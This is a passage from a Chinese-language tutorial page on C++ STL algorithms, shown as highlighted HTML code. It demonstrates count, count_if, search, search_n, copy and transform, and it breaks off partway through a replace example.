data-num=\"75\"></td><td><pre>\t<span class=\"token comment\">// 打印</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>\t<span class=\"token function\">for_each</span><span class=\"token punctuation\">(</span>v1<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> v1<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> MyPrintFun<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>\tcout <span class=\"token operator\">&lt;&lt;</span> endl<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>\t<span class=\"token comment\">// 使用 count 函数统计元素</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre>\t<span class=\"token comment\">// 统计元素中有多少个 13</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>\t<span class=\"token keyword\">int</span> nCt <span class=\"token operator\">=</span> <span class=\"token function\">count</span><span class=\"token punctuation\">(</span>v1<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> v1<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>\tcout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"v1容器中有\"</span> <span class=\"token operator\">&lt;&lt;</span> nCt <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"个13\"</span> <span class=\"token operator\">&lt;&lt;</span> endl<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre></pre></td></tr><tr><td data-num=\"84\"></td><td><pre></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>\t<span class=\"token comment\">// 使用 count_if 函数，根据条件统计元素个数</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>\tnCt <span class=\"token operator\">=</span> <span class=\"token function\">count_if</span><span class=\"token punctuation\">(</span>v1<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> v1<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> divby5<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre>\tcout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"v1容器中有\"</span> <span class=\"token operator\">&lt;&lt;</span> nCt <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"个可以被5整除\"</span> <span class=\"token operator\">&lt;&lt;</span> endl<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre></pre></td></tr><tr><td data-num=\"89\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre></pre></td></tr><tr><td data-num=\"91\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">Study_search</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre>\tvector<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token operator\">></span> v1<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"93\"></td><td><pre></pre></td></tr><tr><td data-num=\"94\"></td><td><pre>\t<span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>size_t i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">5</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"95\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"96\"></td><td><pre>\t\tv1<span class=\"token punctuation\">.</span><span class=\"token function\">push_back</span><span class=\"token punctuation\">(</span>i <span class=\"token operator\">+</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"97\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"98\"></td><td><pre>\t<span class=\"token comment\">// 打印</span></pre></td></tr><tr><td data-num=\"99\"></td><td><pre>\t<span class=\"token function\">for_each</span><span class=\"token punctuation\">(</span>v1<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> v1<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> MyPrintFun<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre>\tcout <span class=\"token operator\">&lt;&lt;</span> endl<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"101\"></td><td><pre></pre></td></tr><tr><td data-num=\"102\"></td><td><pre>\tvector<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token operator\">></span> v2<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"103\"></td><td><pre></pre></td></tr><tr><td data-num=\"104\"></td><td><pre>\t<span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>size_t i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"105\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"106\"></td><td><pre>\t\tv2<span class=\"token punctuation\">.</span><span class=\"token function\">push_back</span><span class=\"token punctuation\">(</span>i <span class=\"token operator\">+</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"107\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"108\"></td><td><pre></pre></td></tr><tr><td data-num=\"109\"></td><td><pre>\t<span class=\"token comment\">// 打印</span></pre></td></tr><tr><td data-num=\"110\"></td><td><pre>\t<span class=\"token function\">for_each</span><span class=\"token punctuation\">(</span>v2<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> v2<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> MyPrintFun<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"111\"></td><td><pre>\tcout <span class=\"token operator\">&lt;&lt;</span> endl<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"112\"></td><td><pre></pre></td></tr><tr><td data-num=\"113\"></td><td><pre>\tvector<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token operator\">></span><span class=\"token operator\">::</span>iterator vit <span class=\"token operator\">=</span> <span class=\"token function\">search</span><span class=\"token punctuation\">(</span>v1<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> v1<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> v2<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> v2<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"114\"></td><td><pre></pre></td></tr><tr><td data-num=\"115\"></td><td><pre>\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>vit <span class=\"token operator\">==</span> v1<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"116\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"117\"></td><td><pre>\t\tcout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"没有发现v1中以容器v2为子序列的元素\"</span> <span class=\"token operator\">&lt;&lt;</span> endl<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"118\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"119\"></td><td><pre>\t<span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"120\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"121\"></td><td><pre>\t\tcout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"发现v1中以容器v2为子序列的元素：\"</span> <span class=\"token operator\">&lt;&lt;</span> <span class=\"token operator\">*</span>vit <span class=\"token operator\">&lt;&lt;</span> endl<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"122\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"123\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"124\"></td><td><pre></pre></td></tr><tr><td data-num=\"125\"></td><td><pre></pre></td></tr><tr><td data-num=\"126\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">Study_search_n</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"127\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"128\"></td><td><pre>\tvector<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token operator\">></span> v1<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"129\"></td><td><pre>\tv1<span class=\"token punctuation\">.</span><span class=\"token function\">push_back</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"130\"></td><td><pre>\tv1<span class=\"token punctuation\">.</span><span class=\"token function\">push_back</span><span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"131\"></td><td><pre>\tv1<span class=\"token punctuation\">.</span><span class=\"token function\">push_back</span><span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"132\"></td><td><pre>\tv1<span class=\"token punctuation\">.</span><span class=\"token function\">push_back</span><span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"133\"></td><td><pre>\tv1<span class=\"token punctuation\">.</span><span class=\"token function\">push_back</span><span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"134\"></td><td><pre>\tv1<span class=\"token punctuation\">.</span><span class=\"token function\">push_back</span><span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"135\"></td><td><pre>\tv1<span class=\"token punctuation\">.</span><span class=\"token function\">push_back</span><span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"136\"></td><td><pre></pre></td></tr><tr><td data-num=\"137\"></td><td><pre>\tvector<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token operator\">></span><span class=\"token operator\">::</span>iterator vit <span class=\"token operator\">=</span> <span class=\"token function\">search_n</span><span class=\"token punctuation\">(</span>v1<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> v1<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"138\"></td><td><pre></pre></td></tr><tr><td data-num=\"139\"></td><td><pre>\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>vit <span class=\"token operator\">==</span> v1<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"140\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"141\"></td><td><pre>\t\tcout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"容器v1中没有3个连续为8的元素\"</span> <span class=\"token operator\">&lt;&lt;</span> endl<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"142\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"143\"></td><td><pre>\t<span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"144\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"145\"></td><td><pre>\t\tcout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"发现v1容器v1中有3个连续为8的元素\"</span> <span class=\"token operator\">&lt;&lt;</span> endl<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"146\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"147\"></td><td><pre></pre></td></tr><tr><td data-num=\"148\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h3 id=\"可变序列算法\"><a class=\"anchor\" href=\"#可变序列算法\">#</a> 可变序列算法</h3>\n<p>可变序列算法是指可以修改它们所操作的容器内容的算法，如下面的拷贝、替换、删除函数：</p>\n<ol>\n<li><code>copy</code>  ：元素复制</li>\n<li><code>transform</code>  ：元素变换，也是复制，按照某种方案复制</li>\n<li><code>replace</code>  ：指定元素替换成新值</li>\n<li><code>replace_if</code>  ：条件替换</li>\n<li><code>remove</code>  ：删除指定元素</li>\n<li><code>remove_if</code>  ：条件移除</li>\n</ol>\n<p>代码如下：</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">Study_copy</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\tvector<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token operator\">></span> v1<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\tv1<span class=\"token punctuation\">.</span><span class=\"token function\">push_back</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\tv1<span class=\"token punctuation\">.</span><span class=\"token function\">push_back</span><span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\tv1<span class=\"token punctuation\">.</span><span class=\"token function\">push_back</span><span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t<span class=\"token comment\">// 打印</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t<span class=\"token function\">for_each</span><span class=\"token punctuation\">(</span>v1<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> v1<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> MyPrintFun<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\tcout <span class=\"token operator\">&lt;&lt;</span> endl<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\tlist<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token operator\">></span> l1<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t<span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>size_t i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">10</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t\tl1<span class=\"token punctuation\">.</span><span class=\"token function\">push_back</span><span class=\"token punctuation\">(</span>i <span class=\"token operator\">+</span> <span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\t<span class=\"token comment\">// 打印</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\t<span class=\"token function\">for_each</span><span class=\"token punctuation\">(</span>l1<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> l1<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> MyPrintFun<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\tcout <span class=\"token operator\">&lt;&lt;</span> endl<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>\t<span class=\"token comment\">// copy</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>\t<span class=\"token function\">copy</span><span class=\"token punctuation\">(</span>v1<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> v1<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> l1<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>\t<span class=\"token comment\">// 打印</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>\t<span class=\"token function\">for_each</span><span class=\"token punctuation\">(</span>l1<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> l1<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> MyPrintFun<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>\tcout <span class=\"token operator\">&lt;&lt;</span> endl<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token comment\">// transform Fun</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">tramsformFunc</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> x<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>\t<span class=\"token keyword\">return</span> x <span class=\"token operator\">*</span> x<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">Study_transform</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>\tvector<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token operator\">></span> v1<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>\tv1<span class=\"token punctuation\">.</span><span class=\"token function\">push_back</span><span class=\"token punctuation\">(</span><span class=\"token number\">11</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>\tv1<span class=\"token punctuation\">.</span><span class=\"token function\">push_back</span><span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>\tv1<span class=\"token punctuation\">.</span><span class=\"token function\">push_back</span><span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>\t<span class=\"token comment\">// 打印</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>\t<span class=\"token function\">for_each</span><span class=\"token punctuation\">(</span>v1<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> v1<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> MyPrintFun<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>\tcout <span class=\"token operator\">&lt;&lt;</span> endl<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>\tlist<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token operator\">></span> l1<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>\t<span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>size_t i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">10</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>\t\tl1<span class=\"token punctuation\">.</span><span class=\"token function\">push_back</span><span class=\"token punctuation\">(</span>i <span class=\"token operator\">+</span> <span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>\t<span class=\"token comment\">// 打印</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>\t<span class=\"token function\">for_each</span><span class=\"token punctuation\">(</span>l1<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> l1<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> MyPrintFun<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>\tcout <span class=\"token operator\">&lt;&lt;</span> endl<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>\t<span class=\"token comment\">// 元素变换，经过一个函数去处理要复制的区间的每个元素。</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>\t<span class=\"token function\">transform</span><span class=\"token punctuation\">(</span>v1<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> v1<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> l1<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> tramsformFunc<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>\t<span class=\"token comment\">// 打印</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>\t<span class=\"token function\">for_each</span><span class=\"token punctuation\">(</span>l1<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> l1<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> MyPrintFun<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>\tcout <span class=\"token operator\">&lt;&lt;</span> endl<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre></pre></td></tr><tr><td data-num=\"64\"></td><td><pre></pre></td></tr><tr><td data-num=\"65\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">Study_replace</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>\tvector<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token operator\">></span> v1<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>\tv1<span class=\"token punctuation\">.</span><span class=\"token function\">push_back</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>\tv1<span class=\"token punctuation\">.</span><span class=\"token function\">push_back</span><span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>\tv1<span class=\"token punctuation\">.</span><span class=\"token function\">push_back</span><span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>\tv1<span class=\"token punctuation\">.</span><span class=\"token function\">push_back</span><span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>\tv1<span class=\"token punctuation\">.</span><span class=\"token function\">push_back</span><span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>\tv1<span class=\"token punctuation\">.</span><span class=\"token function\">push_back</span><span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token 